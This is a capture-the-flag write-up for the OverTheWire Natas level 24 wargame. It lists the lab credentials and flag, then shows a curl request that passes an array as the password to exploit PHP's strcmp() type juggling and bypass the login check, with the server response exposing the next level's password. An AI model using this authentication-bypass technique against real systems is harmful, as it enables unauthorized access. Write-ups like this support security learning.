# Natas24

*	user: `natas24`
*	pass: `OsRmXFguozKpTZZ5X14zNO43379LZveg`
*	url: [http://natas24.natas.labs.overthewire.org](http://natas24:OsRmXFguozKpTZZ5X14zNO43379LZveg@natas24.natas.labs.overthewire.org)
*	flag: `GHF6X7YwACaYYssHVY05cFq83hRktl4c`

## Procedure

1.	In this level, password is checked by using `strcmp()` function.
	According to documentation, this function returns only values `> 0`,
	`< 0` and `= 0`. So our target is to have the return value equal to
	0.

2.	In PHP, `strcmp()` has a strange behaviour. Indeed, if the passed
	arguments are not string, it returns 0. So, let's try by passing the
	empty array `passwd[]`

		$ curl -XGET -u natas24:OsRmXFguozKpTZZ5X14zNO43379LZveg http://natas24.natas.labs.overthewire.org/?passwd%5b%5d
		<html>
		<head>
		<!-- This stuff in the header has nothing to do with the level -->

		[cut]

		<b>Warning</b>:  strcmp() expects parameter 1 to be string, array given in <b>/var/www/natas/natas24/index.php</b> on line <b>23</b><br />
		<br>The credentials for the next level are:<br><pre>Username: natas25 Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c</pre>

		[cut]

		</html>
